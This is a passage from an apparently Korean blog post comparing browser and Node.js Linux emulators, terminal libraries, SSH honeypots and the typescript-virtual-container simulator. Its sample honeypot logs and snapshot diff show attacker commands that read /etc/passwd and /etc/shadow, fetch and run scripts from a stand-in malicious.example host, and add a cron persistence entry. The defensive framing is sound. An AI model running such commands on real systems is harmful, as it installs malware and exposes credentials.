| **npm 패키지** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (CLI 도구) |
| **Node.js 쓰임** | ✅ | ❌ | ❌ | ❌ | ❌ (브라우저만) | Wasmtime 경유 |
| **브라우저 쓰임** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM과 인스턴스** | 150-256 MB | ~64-128 MB | ~64 MB | 200+ MB | ~100 MB | ~200-500 MB |
| **시작 시간** | 15-40초 | 10-30초 | 10-30초 | 15-40초 | 2-5초 | 10-40초 |
| **오픈 소스** | ✅ | ✅ | ✅ | ❌ | 부분 | ✅ |
| **상태** | ✅ 아주 활성 | ✅ 안정 | ⚠️ 보관 | ✅ 상용 | ✅ 활성 | ✅ 활성 |

이 표에서 눈에 띄는 것: `v86`이 npm 패키지이고 브라우저와 Node에서 돌고 오픈 소스인 유일한 것이에요. "JavaScript Linux 에뮬레이터" 대화가 그래서 `v86` 중심이에요. 나머지는 단점이 있어요. JSLinux에 API가 없고, jor1k는 보관됐고, CheerpX는 돈이 들고, WebContainers는 브라우저 전용에 Node 한정, container2wasm은 빌드 단계와 CLI가 필요해요. "JavaScript로 Linux 부팅"만 필요하면 `v86`이 거의 항상 올바른 출발점이에요.

---

## 3부: 터미널 스택. xterm.js와 node-pty

셸 같은 경험을 만들 때 사람들이 계속 가져오는 패키지 둘. 샌드박스나 에뮬레이터가 아니에요. UI와 PTY 배관이에요. 하지만 너무 관련 있어서 빼면 섭섭해요. 그리고 둘 다 써봤고 정말 좋아요.

### 3.1 `xterm.js`: 터미널 렌더링

xterm.js는 브라우저용 터미널 에뮬레이터예요. `<canvas>` 요소에 터미널 화면(VT100과 xterm 이스케이프 연속)을 보여주고, 키보드 입력을 다루고, 자료를 라우팅하는 API를 노출해요.

쓰는 곳: VS Code 내장 터미널, Azure Cloud Shell, Proxmox VE, AWS CloudShell 등등.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// 터미널에 자료 보내기 (텍스트로 표시)
term.write("$ ");
term.onData(data => {
  // data는 키 입력. 백엔드로 보내기
  socket.send(data);
});
socket.onmessage(msg => {
  // 백엔드 출력. 보여주기
  term.write(msg.data);
});
```

xterm.js는 렌더 층일 뿐이에요. 셸을 실행하지 않아요. 명령을 해석하지 않아요. 고르는 백엔드에 연결하는 표시 위젯이에요. 많은 사람이 xterm.js가 "터미널을 한다"고 생각하지만 정말 화면일 뿐이에요. 실제로 명령을 실행하는 것에 여전히 연결해야 해요.

**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)
**GitHub**: [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty`: PTY 만들기

`node-pty`가 Node.js에 의사터미널(PTY)을 만들고 읽기와 쓰기 핸들을 줘요. xterm.js와 함께 쓰면 브라우저 터미널을 만들어 서버에서 도는 진짜 셸(bash, zsh, fish)과 말하게 할 수 있어요.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // 브라우저 xterm.js에 WebSocket으로 보내기
  ws.send(data);
});

ws.on("message", data => {
  // 브라우저 키 입력을 셸에 전달
  shell.write(data);
});
```

클라우드 IDE와 웹 터미널 표준 그림이에요. xterm.js (브라우저)와 WebSocket, node-pty, 진짜 bash. 격리는 여전히 없어요. 셸이 Node.js 프로세스 (또는 실행 사용자) 권한 전부로 실행돼요.

**유지**: Microsoft.
**npm**: [node-pty](https://www.npmjs.com/package/node-pty)
**GitHub**: [microsoft/node-pty](https://github.com/microsoft/node-pty)

## 4부: SSH 허니팟

허니팟은 공격받으려고 설계돼요. 목표는 공격자가 상호작용하게 할 만큼 진짜처럼 보이면서 위협 인텔용으로 하는 모든 것을 기록하는 거예요. SSH가 주 표적이에요. 인터넷에서 가장 공격받는 서비스라서요. 공개 IP에 22번 포트를 열면 말 그대로 몇 분 안에 자동 스캔 시도를 보게 돼요. 언젠가 해보세요. 얼마나 빨리 오는지 꽤 끔찍해요.

허니팟 품질은 두 가지로 재요. **충실도**(진짜 시스템을 얼마나 설득력 있게 흉내 내는가)와 **텔레메트리**(쓸모 있는 자료를 얼마나 잡는가). 둘이 긴장 관계예요. 고충실도 허니팟이 만들기 어렵고 운영이 위험해요.

이 섹션이 결국 `typescript-virtual-container`에 `HoneyPot` 모듈을 만들게 한 것이어서, 여기에는 의견이 좀 있어요.

### 4.1 Cowrie: 황금 표준

Cowrie는 Python 기반 중간에서 높은 상호작용 SSH와 Telnet 허니팟이에요. 연구와 보안 커뮤니티에서 가장 많이 배포된 SSH 허니팟이에요.

아키텍처:

- **프로토콜 층**: 진짜 SSH 프로토콜 구현 (Twisted Conch). 공격자가 진짜 핸드셰이크와 진짜 키 교환, 진짜 인증을 겪어요
- **셸 층**: 가짜 파일시스템 (Debian 5.0 비슷)과 흔한 명령에 답하는 부분 셸 인터프리터
- **프록시 모드**: 뒤의 진짜 시스템으로 넘길 수 있어요 (높은 상호작용 모드). 지나가는 모든 것을 기록해요
- **LLM 모드** (최근 추가): 모르는 명령에 동적 답장을 만들려고 언어 모델을 써요. 네, Cowrie에 이제 AI 모드가 있어요. 미친 시대에 살고 있어요.

```python
# Cowrie가 잡는 것
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie가 내려받은 파일(wget과 curl, SFTP와 SCP 경유)을 멀웨어 분석용으로 저장해요. Splunk와 Elasticsearch, 다른 SIEM 플랫폼과 통합돼요.

**충실도**: 중간에서 높음. 자동 봇(SSH 공격자의 99퍼센트. 대부분 `root`와 `password`를 시도하는 바보 스크립트)을 속이기에 충분히 설득력 있어요. 정교한 사람은 지문으로 식별할 수 있어요. 보통 꽤 빨리요.

**언어**: Python (Twisted)
**GitHub**: [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo: Cowrie 전신

Kippo는 Cowrie 토대가 된 원래 중간 상호작용 SSH 허니팟이에요. 같은 기본 생각: 진짜 SSH 프로토콜, 가짜 파일시스템, 부분 셸. Cowrie가 이 시점에 완전히 대체했어요. Kippo는 보관됐고 2026년에 아무도 쓰면 안 돼요. 역사 완전성을 위해 순수하게 언급해요. 옛 블로그 글과 보안 논문에 참조된 것을 볼 수 있으니까요.

**GitHub**: [desaster/kippo](https://github.com/desaster/kippo). 보관됨

---

### 4.3 endlessh: SSH 타피트

endlessh는 퇴화 허니팟이에요. SSH 연결을 배너 자료를 초당 1바이트 (또는 그 이하)로 천천히 흘려보내 열어 둬요. 여기에 접속하는 SSH 클라이언트는 무한히 막혀요. 서버가 배너 보내기를 절대 끝내지 않아 인증에 절대 이르지 않아요.

목표는 위협 인텔이 아니라 순수 자원 거부예요. 공격자 스캔 스레드를 붙잡아 진짜 표적에 그만큼 빨리 이르지 못하게 해요. 좋은 의미로 솔직히 조금 악마적이에요. 공격자에게서 아무것도 배우지 않아요. 그냥 시간을 낭비하게 해요. 깊이 만족스러운 것이 있어요.

```c
// endlessh의 전체 프로토콜 동작:
// 보내기: "SSH-2.0-OpenSSH_" 다음 무작위 문자를 천천히 더하기
// 연결을 절대 닫지 않아요
// 공격자 스캐너가 N초 뒤 시간 초과돼요
```

잡히는 명령 없어요. 테스트되는 인증 없어요. 연결 시간만요.

**쓴 언어**: C
**GitHub**: [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame: "모두 들여보내기" 허니팟

sshesame이 모든 SSH 연결을 받아들여요 (어떤 사용자든 어떤 비밀번호든 어떤 키든). 전부 기록해요. 상호작용 제로 허니팟이에요. 명령에 답하지 않고, 공격자를 그냥 "들여보내고" 치는 키 입력마다 기록해요.

```
2024-01-15 03:22:11 Connexion de 45.33.32.156
  사용자: root, 비밀번호: password123 -- 수락됨
  친 명령:
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  47초 뒤 접속 끊김
```

자격 증명 수확에 쓸모 있어요. 봇이 시도하는 사용자 이름과 비밀번호를 빨리 쌓아요. 지금 활발히 무차별 대입되는 기본 자격 증명이 무엇인지 알려줘요. 스포일러: 항상 `root`와 `password`, `admin`과 `admin`, `root`와 `123456`이에요. 매번.

**GitHub**: [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird: Docker 기반 허니팟 프레임워크

`lyrebird/honeypot-base`는 네트워크 서비스 허니팟을 만드는 Docker 베이스 이미지예요. 특별히 SSH 허니팟이 아니에요. 어떤 프로토콜 허니팟을 만드는 프레임워크예요.

베이스 이미지가 로깅 프레임워크와 프로토콜 플러그인 시스템, 멀티서비스 허니팟용 Docker Compose 설정을 줘요. 특정 서비스를 흉내 내도록 확장해요.

**Docker Hub**: [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Node.js로 SSH 허니팟 만들기. 순진한 방법과 왜 실패하는지

`typescript-virtual-container` 전에는 Node.js로 SSH 허니팟을 만든다는 것이 진짜 `ssh2` 라이브러리와 손으로 명령 흉내를 합친다는 뜻이었어요. 아주 지루하고 아주 불완전해요. 하지만... 이 시점에서는 통과의례예요.

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // 시도 기록
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // 모두 들여보내기
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // 흉내 답장
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

자격 증명과 명령을 잡는 의미에서는 "동작"해요. 하지만 정교한 공격자가 조금만 파면 뻔히 가짜예요. `uname -a`는 올바른 문자열을 돌려주지만 `ls /etc`는 "command not found"예요. 함정 냄새가 진동해요. 파일시스템이 없어요. 명령이 이어지지 않아요. 파이프가 안 돼요. 변수가 확장되지 않아요.

유능한 공격자는 처음 다섯 명령 안에 여러분 허니팟을 식별해요. Cowrie식 행동을 찾는 자동 스크립트도 바로 감지해요. `typescript-virtual-container` 저자가 명령을 진짜로 해석하는 무언가를 만들게 된 것이 겉보기에는 바로 이거예요. 5부에서 더 나와요.

---

### 허니팟 계열 요약

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | 순진 ssh2 |
|---|---|---|---|---|---|---|
| **상호작용 수준** | 중간에서 높음 | 중간 | 제로 | 제로 | 가변 | 낮음 |
| **진짜 SSH 프로토콜** | ✅ | ✅ | ❌ (타피트) | ✅ | 가변 | ✅ |
| **셸 충실도** | 중간 | 중간 | n/a | 없음 | 가변 | 최소 |
| **자격 증명 잡기** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **명령 잡기** | ✅ | ✅ | ❌ | ✅ | 가변 | ✅ |
| **멀웨어 잡기** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **SIEM 통합** | ✅ 네이티브 | ❌ | ❌ | ❌ | ❌ | 손으로 |
| **LLM 답장** | ✅ (신규) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **언어** | Python | Python | C | Go | Docker | Node.js |
| **Node.js 네이티브** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **상태** | ✅ 아주 활성 | ⚠️ 보관 | ✅ 활성 | ✅ 활성 | ✅ 활성 | 직접 만들기 |

여기 패턴이 꽤 분명해요. 충실도를 원할수록 Python을 많이 써야 해요. 진지하게 하면 Cowrie가 부동의 승자예요. 현장에서 수년 검증됐고 단순 자격 증명을 훨씬 넘어 잡아요. endlessh와 sshesame은 진지한 위협 인텔 도구보다 재미 프로젝트예요. Node.js 순진 접근은 벽에 부딪히기 전에 20퍼센트쯤 가요.

---

## 5부: `typescript-virtual-container`. 간극을 메우는 것

좋아요, 여기에서 흥미로워져요. 위 계열을 전부 목록화한 뒤 빠진 사분면이 꽤 분명해져요.

- JS 샌드박스: 코드를 격리하고 셸도 파일시스템도 SSH도 없어요
- Linux 에뮬레이터: 진짜 OS와 진짜 셸, 진짜 SSH... 하지만 RAM 150MB 이상에 시작 30초, 직렬 입출력 위에 API를 직접 만들어야 해요
- 허니팟: 가짜 셸, 프로그래밍 API 없음, Python과 Go, C, 네이티브 Node 아님

아무도 완전하고 프로그래밍 가능하고 네이티브 Node인 Linux 환경을 만들지 않았어요. 진짜 SSH와 진짜 권한, 진짜 가상 네트워크, 타입화된 TypeScript API와 함께요. 그래서 그녀가 만들었어요.

처음 제대로 언급하니 간단히 소개해요. `typescript-virtual-container`는 [Chloé Rolzhausen](https://itsrealfortune.fr)이라는 프랑스 개발자가 만들었어요. 온라인에서는 **Fortune** (또는 ItsRealFortune)이라고 해요. [웹사이트](https://itsrealfortune.fr)와 [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/)에서 찾을 수 있어요. 전체 프로젝트 TypeScript 56,000줄과 파일 247개, 명령 170개를 한 사람이 혼자 했어요. 이 글 나머지에서 Fortune이라고 부를게요. 네, 꽤 미쳤어요. 작업물을 보러 가세요!

### 실제로 무엇인가요

`typescript-virtual-container`는 순수 TypeScript로 쓴 **Linux 환경 시뮬레이터**예요. Wasm도 네이티브 확장도 커널도 없어요. 소스 56,000줄이 TypeScript 파일 247개에 있어요.

핵심 통찰: `ls /etc | grep passwd`를 돌리는 데 CPU 에뮬레이터가 필요 없어요. 필요한 것은요.

1. 경로 연산에 답하는 메모리 속 노드 트리
2. 매 접근에 적용되는 POSIX 권한 모델
3. 파이프라인과 리디렉션, 하위 셸, 변수 확장을 이해하는 셸 구문 파서
4. ~170개 명령 구현 (함수지 바이너리 아님)
5. 사용자와 그룹 관리 시스템
6. SSH로 이 모든 것을 노출하는 것

전부 커널 관여 없이 순수 TypeScript로 가능해요.

### 가상 파일시스템

VFS는 타입화된 노드의 메모리 속 트리예요. `"fs"` 영속 모드를 명시 켜지 않는 한 디스크 입출력 없어요.

```ts
// 단순화된 내부 표현
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // 느리게 불러오는 플레이스홀더
```

각 경로 연산이 `normalizePath`(`..`, 심링크 풀기)를 거쳐 `enforceAccess`(요청 uid와 gid 대비 읽기와 쓰기, 실행 권한 확인)를 거쳐요. `chmod`와 `chown`, 스티키 비트, setuid가 모두 구현되고 실제로 적용돼요. uid 1000으로 도는 프로세스가 root 소유 모드 0600 파일을 읽으려고 하면 EACCES가 나요. 가짜 EACCES가 아니라 권한 검사에서 던지는 진짜 JavaScript `Error`예요. 이 부분 꽤 우아해요, 솔직히.

VFS 직렬화는요.

- `.vfsb`: 간결 바이너리 형식 (맞춤, fflate 압축). 기본 형식
- JSON 스냅샷: 사람 읽기용, 디버깅에 좋아요
- TAR 아카이브: 진짜 tar 형식 가져오기와 내보내기. `tar -xf`를 하면 VFS에 그냥... 파일이 있어요
- SquashFS 이미지: 읽기 전용 가져오기

`"fs"` 영속 모드에서는 복구용 선행 기입 로그(WAL)를 유지해요. 쓰기가 먼저 로그에 간 뒤 플러시 때 스냅샷에 가요. 연산 중간에 Node가 죽으면 로그로 마지막 완전 상태를 복원할 수 있어요.

`FileCache` 층도 있어서 디스크 입출력 지연을 흉내 내요. `NVME_DISK_IO`와 `HDD_DISK_IO` 같은 프로파일을 설정하면 VFS가 현실 타이밍에 맞추려고 파일 연산을 인위 지연시켜요. 하드웨어를 흉내 내려 일부러 느려지는 소프트웨어라니 꽤 웃겨요. 하지만 벤치마킹에 사실 아주 쓸모 있어요.

### 셸 인터프리터

셸 구문 파서가 타입화된 AST를 만들어요.

```ts
// "ls /etc | grep root && echo done" 파싱 결과:
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

실행자가 이 AST를 훑어요.

- 파이프라인이면 `{ stdin, stdout, stderr }` 흐름 사슬을 만들고 파이프된 입출력으로 각 명령을 실행해요
- 논리 연산자(`&&`, `||`)면 왼쪽 뒤 `$?`를 확인하고 오른쪽 실행 여부를 정해요
- 하위 셸(`$(...)`, 백틱)이면 실행 맥락을 갈라요
- 리디렉션(`>파일`, `>>파일`, `2>&1`, `<파일`)이면 실행 전 흐름 배선을 설정해요
- 백그라운드 작업(`cmd &`)이면 끝나기를 기다리지 않고 실행해요
- 변수면 `$VAR`와 `${VAR:-default}`, `${#VAR}`, `$((expr))` 산술을 확장해요
- 중괄호 확장(`{a,b,c}`, `{1..5}`)이면 실행 전 전체 확장 목록을 만들어요

전부 진짜 POSIX 셸 동작이에요. 파서가 heredoc과 프로세스 치환, 글로빙(`*`, `?`, `[abc]`), 따옴표 처리(홑따옴표와 보간 있는 겹따옴표, 백슬래시 이스케이프)를 다뤄요. 완벽하지 않아요. 경계 경우 있어요. 하지만 TypeScript 프로젝트에 기대하는 것을 훨씬 넘어요.

### ~170개 내장 명령

명령은 명령 컨텍스트(stdin과 stdout, stderr 흐름, VFS, 사용자 세션, 셸 환경, 하위 모듈 접근)를 받는 TypeScript 함수로 명령 레지스트리에 등록돼요.

170개 Unix 명령 구현을 쓰는 것은... 많아요. 일부는 사소하고 (`echo`, `true`, `false`) 일부는 놀라울 정도로 복잡해요 (`awk`, `find`, `tar`). 완전한 POSIX `awk`를 TypeScript로요? 솔직히 미쳤어요. 들어 있는 것 샘플이에요.

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (클라이언트 쪽, 나가는 연결),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (스텁), python3 (스텁), node (스텁),
nano (완전한 인터랙티브 편집기), vim (기본), vi (기본),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (흉내), systemctl (스텁), journalctl (스텁),
...그리고 약 130개 더
```

"스텁"(git, python3, node)은 흔한 호출에 현실적으로 답해요. `python3 --version`은 믿을 만한 버전 문자열을 돌려주고, `git status`는 가짜 저장소 상태를 보여줘요. 진짜 일을 하지 않아요. 허니팟에는 실제로 진짜 명령보다 쓸모 있어요. 공격자가 무엇을 실행하려고 하는지 위험한 것을 실행하지 않고 관찰할 수 있으니까요.

### SSH 서버

SSH 층은 진짜 npm 패키지 `ssh2`를 써요. 진짜 SSH 프로토콜, 진짜 키 교환, 진짜 암호화. `SSHMimic`이 감싸요.

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// 진짜 SSH: ssh -p 2222 root@localhost
// 진짜 SFTP: sftp -P 2222 root@localhost
// 진짜 SCP: scp -P 2222 file root@localhost:/tmp/
```

`shellProperties`가 `uname -a`와 `lsb_release -a`, `neofetch`, `/proc/version`, `/etc/os-release` 보고를 정해요. 어떤 Linux 배포판과 커널 버전이든 설득력 있게 흉내 낼 수 있어요. 진짜 SSH 클라이언트에는 말 그대로 차이를 알 방법이 없어요.

### HoneyPot 모듈

셸 인터프리터가 진짜고 SSH 서버가 진짜라서, 공격자 명령이 가상 환경에서 실제로 실행돼요. 공격자가 일으킨 `wget` 요청이 목적 URL과 함께 기록돼요. 공격자가 만든 파일이 VFS에 저장돼요. 공격자 권한 상승 시도가 현실적 오류를 만들어요.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// 세션 뒤 파일시스템 비교
const before = shell.vfs.toSnapshot();
// ... 공격자 세션 ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

Cowrie와 질적으로 달라요. Cowrie 가짜 파일시스템은 `ls`에 답할 수 있지만 공격자가 만든 파일과 변경을 구조 diff로 실제로 따라갈 수 없어요. `typescript-virtual-container`는 할 수 있어요. VFS가 살아 있는 자료구조라서 매 쓰기가 따라가니까요. 공격자가 방금 더한 cron 항목이요? diff에 있어요. 그 `.hidden` 폴더요? diff에 있어요. 멀웨어 분석에 꽤 쓸모 있어요.

### 가상 네트워크 스택

아마 이 프로젝트 전체에서 가장 인상적인 부분이고, 이 공간 다른 프로젝트에 대응물이 없어요. 순수 TypeScript로 쓴 완전한 L2와 L3 가상 네트워크 스택에 VPN 지원까지. 진짜 네트워크 카드 하나 없이요. 정말 미쳤어요.

`VirtualNetworkManager`가 각 `VirtualShell` 인스턴스에 설정 가능한 IP 주소와 라우팅 표, 소프트웨어 방화벽(iptables식 규칙에 conntrack과 NAT)이 있는 가상 네트워크 인터페이스를 줘요. `ip addr`와 `ip route`, `iptables -L`, `netstat -rn`이 모두 가상 네트워크 상태를 보여줘요.

`VirtualSwitch`(Baie라는 이름. 서버 베이 프랑스어 "baie informatique"에서)가 공유 서브넷에 여러 셸을 이어요. 구현하는 것은요.

- MAC 학습과 ARP
- 서브넷 사이 IP 라우팅
- NAT (나가는 마스커레이드)
- DNS (서브넷별 설정 가능 레코드)
- 부하 분산 (라운드 로빈, 최소 연결)
- 트래픽 형성: 지연과 지터 (가우스 분포), 패킷 손실과 버스트 손실, 재정렬, 복제
- 대역폭 제한 (토큰 버킷)
- MTU 적용
- 상태 연결 추적 (NEW과 ESTABLISHED, TIME_WAIT 상태와 함께)

```ts
const baie = new Baie("192.168.0.0/24");

// 같은 스위치의 가상 머신 셋
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// 방화벽: web은 api에 닿고 api는 db에 닿지만 web은 db에 직접 닿지 않아요
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// 트래픽 형성: 바깥으로 불안정한 WAN 링크 흉내
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn`이 Baie 인스턴스 사이 암호 터널을 만들어요. 사이트 사이 VPN 연결이 있는 멀티사이트 네트워크를 흉내 낼 수 있어요.

`VirtualProxy`가 포트 포워딩과 SOCKS5 프록시를 구현해요.

이 중 어느 것도 진짜 네트워크 카드에 닿지 않아요. 전부 TypeScript 객체 라우팅이에요. `ping` 명령이 가상 스위치로 라우팅해서 흉내 ICMP 답장을 돌려주니 "동작"해요. `curl http://192.168.0.3/api`가 가상 네트워크로 라우팅해서 api 셸 흉내 HTTP 답장에 닿고 내용을 돌려줘요. 좋은 의미로 끝까지 거북이예요.

### `SandboxedShell`

프로그래밍 쓰임에 더 강한 격리가 필요하면 `SandboxedShell`이 Node 워커 스레드에서 셸 세션을 실행해요.

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 코어 25퍼센트
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

여기 격리는 VFS 층(워커 스레드 셸이 가상 파일시스템만 보고 호스트 파일시스템은 절대 못 봐요)과 Node 워커 스레드 메모리 격리로 보장돼요. `isolated-vm`보다 가볍지만 셸 수준 격리에는 더 적절하고 JS 수준 격리가 아니에요.

### 자원 상한

셸별 자원 한도를 설정해서 시스템 모니터링 명령 보고에 영향을 줄 수 있어요.

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

이 셸 안에서 `free -m`이 총 RAM 512MB를 보여줘요. `nproc`가 2를 돌려줘요. `/proc/meminfo`가 상한 값을 보여줘요. `htop`과 `top`이 상한 CPU 수를 보여줘요. 흉내 기기의 하드웨어 크기를 정확히 정할 수 있어요.

### 세 가지 배포 모드

```
모드 1: SSH와 SFTP 서버
  VirtualSshServer / VirtualSftpServer
  → 진짜 SSH 프로토콜, 진짜 SFTP, 진짜 SCP
  → 쓰임: 허니팟, 원격 테스트 환경, 훈련 랩

모드 2: 웹 셸 (브라우저)
  builds/fortune-nyx-v1.7.8-web.min.js (ESM 번들)
  → 브라우저에서 돌고 VFS가 IndexedDB에 영속돼요
  → 쓰임: 인터랙티브 튜토리얼, 임베디드 터미널, 데모
  → 보너스: 흉내 XFCE 데스크톱용으로 startxfce4 실행

모드 3: 독립 CLI
  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs (파일 하나, 설치 없음)
  → curl로 실행하고 VFS를 .vfs/ 디렉터리에 영속
  → 쓰임: 빠른 데모, 로컬 실험
```

### 폴리필: Wasm 없이 브라우저 빌드가 동작하는 방법

좋아요, 제가 정말 영리하다고 생각하고 특별히 강조하고 싶었던 부분이에요.

브라우저에서 Node.js 라이브러리를 동작시키는 것은 보통 악몽이에요. 무겁고 불러오기 느린 Wasm 런타임을 쓰거나, 각 `node:*` import를 브라우저 호환 대안으로 바꾸느라 몇 주를 쓰거나요. Fortune은 두 번째를 했어요. 하지만 아주 깔끔하게 맞춤 폴리필 묶음을 써서 저장소 `polyfills/` 디렉터리에 살아요.

빌드 파이프라인은 그냥 alias 항목 잔뜩인 esbuild예요.

```js
// demo/build.js -- 브라우저 빌드 전체 설정
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Wasm도 외부 폴리필 라이브러리도 `webpack-node-externals` recours도 없어요. 그냥 별칭 모듈들과 주입 전역 몇 개. 일부는 정말 인상적이라 하나씩 설명할게요.

**`node:fs`: 가짜 파일시스템으로서의 IndexedDB**

제 최애예요. `node:fs` 폴리필이 동기 Node.js fs API(`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...)를 두 층으로 받쳐요. 동기 읽기용 메모리 `Map`과 페이지 새로고침 사이 영속용 IndexedDB. 쓰기는 Map에 바로 가요 (그래서 `writeFileSync` 바로 뒤 `readFileSync`가 항상 동작해요). 다음 백그라운드에서 비동기로 IndexedDB에 비워요.

```js
// 동기 캐시 (경로 → Uint8Array | null). 바로 읽기
const memCache = new Map();

// 시작할 때 IndexedDB 전체를 memCache에 미리 불러오기
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

브라우저에서 VFS 스냅샷이 페이지 새로고침을 살아남는 이유가 바로 이거예요. `.vfsb` 바이너리 전체가 이 폴리필로 IndexedDB에 쓰이고 다음 불러오기 때 읽혀요. Wasm도 서버도 없어요. 2011년부터 모든 브라우저에 있는 IndexedDB뿐이에요.

